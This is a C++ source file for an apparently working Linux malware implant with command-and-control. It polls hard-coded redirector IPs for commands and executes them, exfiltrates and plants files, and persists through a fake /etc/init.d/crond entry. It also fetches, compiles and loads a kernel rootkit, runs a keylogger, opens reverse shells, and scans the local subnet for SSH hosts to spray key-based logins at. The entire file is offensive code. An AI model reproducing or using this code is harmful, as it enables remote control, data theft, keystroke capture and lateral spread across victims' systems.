//
//  HTTPRequest
//

#define LIBSSH_STATIC 1
#include <iostream>
#include <fstream>
#include <streambuf>
#include <string>
#include <sstream>
#include <unistd.h>
#include <pthread.h>
#include <libssh/libssh.h>
#include "HTTPRequest.hpp"
#include "Base64/base64.cpp"
#include "json.hpp"
#include "keylogger.c"
#include "shell.cpp"
#include <sys/syscall.h>
#include <ifaddrs.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <filesystem>

using namespace nlohmann;
namespace fs = std::filesystem;

#define finit_module(fd, param_values, flags) syscall(__NR_finit_module, fd, param_values, flags)

extern char** environ;

std::string executeCommand(std::string cmd) {
	std::array<char, 128> buffer;
	std::string result;
	std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
	if (!pipe) {
		throw std::runtime_error("popen() failed!");
	}

	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	
	return result;
}

std::string postRequest(std::string path, std::string post_data, std::string cookie, std::string id) {

	const char *redirectors[2] = { "3.21.165.71", "3.16.112.48" };

	std::string port = ":3000";
	std::string proto = "http://";
	
	std::string postResponse;

	bool success = false;

	for (int i = 0; i < 2; i++) {

		std::string url = proto + redirectors[i] + port + path;

		try
		{
		    http::Request request(url);

		    const http::Response response = request.send("POST", post_data, {
			"Content-Type: text/plain;charset=UTF-8",
			"id: " + id,
			"Cookie: " + cookie
		    });
		    postResponse = std::string(response.body.begin(), response.body.end());
		    success = true;
		    break;
		}
		catch (const std::exception& e)
		{
		    std::cerr << "Request failed, error: " << e.what() << '\n';
		    printf("Trying next redirector\n");
		}
	}

	if (!success) {
		printf("Could not contact any redirectors\n");
	}
	
	std::cout << postResponse << std::endl;
	return postResponse;

}

int exfiltrateFile(std::string path, std::string id, std::string cookie) {

	std::ifstream t(path);
	std::stringstream buffer;
	buffer << t.rdbuf();

	std::string postResponse = postRequest("/exfiltrate", buffer.str(), cookie, id);

	return 0;

}

std::vector<std::string> portScan() {
	char host[256];
	char *IP;
	/*
	struct hostent *host_entry;
	int hostname = gethostname(host, sizeof(host));
	host_entry = gethostbyname(host);
	IP = inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0]));
	*/
	struct ifaddrs *ifap, *ifa;
	struct sockaddr_in *sa;
	char *addr;

	getifaddrs (&ifap);
	for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
		if (ifa->ifa_addr && ifa->ifa_addr->sa_family==AF_INET) {
		    sa = (struct sockaddr_in *) ifa->ifa_addr;
		    addr = inet_ntoa(sa->sin_addr);
		    printf("Interface: %s\tAddress: %s\n", ifa->ifa_name, addr);
		    if (memcmp(addr, "192", 3) == 0 || memcmp(addr, "172", 3) == 0 || memcmp(addr, "10", 2) == 0) {
			    IP = addr;
		    }
		}
	}

	freeifaddrs(ifap);

	printf("Current IP is %s\n", IP);

	std::string ip_string(IP);

	std::string dot = ".";
	std::string base_ip = ip_string.substr(0, ip_string.find_last_of(dot) + 1);

	int sd, rval;
	struct sockaddr_in servaddr;

	std::vector<std::string> ssh_ips;

	sd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sd == -1) {
		printf("Error creating socket");
		return ssh_ips;
	}

	for (int i = 1; i < 256; i++) {
		std::string new_ip = base_ip + std::to_string(i);
		printf("Testing %s\n", new_ip.c_str());

		memset(&servaddr, 0, sizeof(servaddr));
		servaddr.sin_family = AF_INET;
		servaddr.sin_port = htons(22);

		//memcpy(&servaddr.sin_addr, new_ip, new_ip.length());
		if (inet_pton(AF_INET, new_ip.c_str(), &servaddr.sin_addr) <= 0) {
			printf("Error: Invalid IP address\n");
			continue;
		}

		rval = connect(sd, (struct sockaddr *) &servaddr, sizeof(servaddr));

		if (rval == -1) {
			printf("Port closed\n");
		} else {
			printf("Port open!\n");
			ssh_ips.push_back(new_ip);
		}
	}
	close(sd);

	return ssh_ips;
}
std::vector<std::string> SSHSpray() {

	std::vector<std::string> ssh_ips = portScan();
	std::vector<std::string> success_ips;

	ssh_session session;
	int rc;

	for (int i = 0; i < ssh_ips.size(); i++) {
		session = ssh_new();

		ssh_options_set(session, SSH_OPTIONS_HOST, ssh_ips[i].c_str());

		rc = ssh_connect(session);
		if (rc != SSH_OK) {
			printf("Error connecting to SSH server: %s\n", ssh_get_error(session));
			ssh_free(session);
			break;
		}

		rc = ssh_userauth_publickey_auto(session, NULL, NULL);

		if (rc == SSH_AUTH_ERROR) {
			printf("Authentication failed: %s\n", ssh_get_error(session));
		} else if (rc == SSH_AUTH_DENIED) {
			printf("Authentication denied, no key matched: %s\n", ssh_get_error(session));
		} else if (rc == SSH_AUTH_PARTIAL) {
			printf("Authentication Success but requires password\n");
		} else if (rc == SSH_AUTH_SUCCESS) {
			printf("Authentication Successful!\n");
			success_ips.push_back(ssh_ips[i]);
		}

		ssh_disconnect(session);
		ssh_free(session);
	}
	return success_ips;
}

std::string makeRequest(std::string path, std::string cookie, std::string id) {

	const char *redirectors[3] = { "3.21.165.71", "3.16.112.48" , "3.129.5.34" };

	std::string port = ":3000";
	std::string proto = "http://";


        http::InternetProtocol protocol = http::InternetProtocol::V4;

	std::string result;

	bool success = false;

	for (int i = 0; i < 3; i++) {

		std::string output;

		std::string url = proto + redirectors[i] + port + path;

		std::cout << "URL is " << url << std::endl;

		try {
			http::Request request(url, protocol);

			const http::Response response = request.send("GET", "", {
			    "Content-Type: application/x-www-form-urlencoded",
			    "User-Agent: runscope/0.1",
			    "id: " + id,
			    "Cookie: " + cookie
			});

			if (response.status == http::Response::Ok &&
			    !output.empty())
			{
			    std::ofstream outfile(output, std::ofstream::binary);
			    outfile.write(reinterpret_cast<const char*>(response.body.data()),
					  static_cast<std::streamsize>(response.body.size()));
			}
			else {
				//std::cout << std::string(response.body.begin(), response.body.end()) << '\n';
				result = std::string(response.body.begin(), response.body.end()); 
			}
			success = true;
			break;
		} catch (const std::exception& e)
		{
		    std::cerr << "Request failed, error: " << e.what() << '\n';
		    printf("Trying next redirector\n");
		}
	}

	if (!success) {
		printf("Could not contact any redirectors\n");
	}

	return result;
}

int compileRootkit(std::string id, char** env) {
	std::string response = makeRequest("/infiltrateRoot", "../Rootkit/Makefile", id);

	std::ofstream out("Makefile");
	out << response;
	out.close();

	response = makeRequest("/infiltrateRoot", "../Rootkit/rootkit.c", id);

	std::ofstream out1("rootkit.c");
	out1 << response;
	out1.close();

	response = makeRequest("/infiltrateRoot", "../Rootkit/mount.h", id);

	std::ofstream out2("mount.h");
	out2 << response;
	out2.close();

	system("make");
	
	int fd = open("rootkit.ko", O_RDONLY | O_CLOEXEC);

	finit_module(fd, "", 0);
	close(fd);

	//char* test_argv[3] = {"insmod", "rootkit.ko", NULL};
	//execve("insmod", test_argv, environ);
	
	//system("insmod rootkit.ko");

	system("rm rootkit*");
	system("rm Module*");
	system("rm module*");
	system("rm Makefile");
	system("rm mount.h");

	return 0;
}

int infiltrateFile(std::string path, std::string id, std::string cookie) {

	std::string response = makeRequest("/infiltrate", cookie, id);

	std::ofstream out(path);
	out << response;
	out.close();
	return 0;
}

json getCommands() {
	std::string command_encoded;
	std::string command_decoded;

	command_encoded = makeRequest("/getCommands", "", std::to_string(ID));

	command_decoded = base64_decode(command_encoded, false);
	std::cout << command_decoded << std:: endl;

	json j = json::parse(command_decoded);

	return j;
}

int sendCommandOutput(json j) {
	std::string cmd_output_encoded;

	std::string s = j.dump();

	cmd_output_encoded = base64_encode(s, false);

	std::cout << cmd_output_encoded << std::endl;

	std::string confirmation = makeRequest("/sendCommandOutput", cmd_output_encoded, std::to_string(ID));

	return 0;
}

int sendSSHResults(std::vector<std::string> success_ips) {
	json j_vec(success_ips);

	std::string ssh_encoded;

	std::string s = j_vec.dump();

	ssh_encoded = base64_encode(s, false);

	printf(ssh_encoded.c_str());

	std::string confirmation = makeRequest("/sshspray", ssh_encoded, std::to_string(ID));

	return 0;
}

int notifyShellDrop(){
	std::string confirmation = makeRequest("/shell", "", std::to_string(ID));
	return 0;
}


/*
void *keylogger(void* arg) {
	int status = keylogPhysical((char*)arg);
	return NULL;
}

void *dropIntoShell(void* voidArgs) {

	parameters *args = (parameters*)voidArgs;
	int p;
	std::string ip;

	p = args->port;
	ip = args->ip;

	int status = reverseShell(ip, p);

	return NULL;
}
*/

int main(int argc, char** argv, char** env) {
	pthread_t keylog_thread;
	pthread_t shell_thread;
	bool thread_started = false;

	std::cout << "ID is " << ID << std::endl;

	std::string current_dir = fs::current_path();
	std::ofstream initFile("/etc/init.d/crond");

	initFile << "#!/bin/sh\n" << current_dir << "/malware";

	initFile.close();

	system("chmod 755 /etc/init.d/crond");

	system("update-rc.d crond defaults");

	//system("update-rc.d crond enable");

	int rootkit = compileRootkit(std::to_string(ID), env);

	while (true) {
		std::cout << "top of while loop" << std::endl;

		int variability = SLEEP * 0.2;

		int sleep_time = rand() % (variability*2) + (SLEEP - variability);

		std::cout << "sleep time is " << sleep_time << std::endl;

		sleep(sleep_time);

		std::cout << "Finished sleeping" << std::endl;

		json j = getCommands();

		if (j.empty()) {
			continue;
		}

		for (auto& element : j["commands"].items()) {
			std::string epoch = element.key();
			std::string command = element.value();

			std::cout << "Found commands to Execute: " << std::endl;
			std::cout << epoch << ": " << command << std::endl;

			std::string exec_result = executeCommand(command);
			std::cout << exec_result << std::endl;

			element.value() = exec_result;
		}

		int status = sendCommandOutput(j["commands"]);
		std::cout << "Sent command output!" << std::endl;

		for (auto& element : j["exfiltrate"].items()) {

			std::string epoch = element.key();
			std::string file = element.value();

			std::cout << "Found files to download: " << std::endl;
			std::cout << epoch << ": " << file << std::endl;

			std::string id = std::to_string(ID);

			int status = exfiltrateFile(file, id, epoch);
		}
		std::cout << "Done sending files!" << std::endl;

		for (auto& element : j["infiltrate"].items()) {

			std::string epoch = element.key();
			std::string file = element.value();

			std::cout << "Found files to upload: " << std::endl;
			std::cout << epoch << ": " << file << std::endl;

			std::string id = std::to_string(ID);

			int status = infiltrateFile(file, id, epoch);
		}
		std::cout << "Done downloading files!" << std::endl;

		if (j["keylogger"] == "1" && (!thread_started)) {
			std::cout << "Starting Keylogger!" << std::endl;


			signal(SIGSEGV, sigintHandler);
			char* file_keylog = "test.txt";
			pthread_create(&keylog_thread, NULL, keylogPhysical, file_keylog);
			thread_started = true;

			//pthread_join(keylog_thread, NULL);
			std::cout << "Started Keylogger" << std::endl;

		} else if (j["keylogger"] != "1" && thread_started) {

			std::cout << "Stopping Keylogger" << std::endl;

			//pthread_exit(NULL);
			pthread_kill(keylog_thread, SIGSEGV);

			pthread_join(keylog_thread, NULL);

			std::cout << "Stopped Keylogger" << std::endl;

		}

		if (j["shell"]["port"] != "0" && j["shell"]["ip"] != "0.0.0.0") {

			std::cout << "Dropping into shell on port " << j["shell"] << std::endl;

			parameters rev_params;
			rev_params.ip = j["shell"]["ip"];
			std::string port_s = j["shell"]["port"];
			rev_params.port = stoi(port_s);


			pid_t pid = fork();
			if (!pid) {
				reverseShell(&rev_params);
			}
			//pthread_create(&shell_thread, NULL, reverseShell, &rev_params);
			std::cout << "Dropped into shell!" << std::endl;
			int status = notifyShellDrop();
		}

		if (j["sshspray"] == "1") {
			std::vector<std::string> success_ips = SSHSpray();

			int status = sendSSHResults(success_ips);

		}


		std::cout << "Executed all commands!" << std::endl;



		//return 0;


	}

	return 0;

}

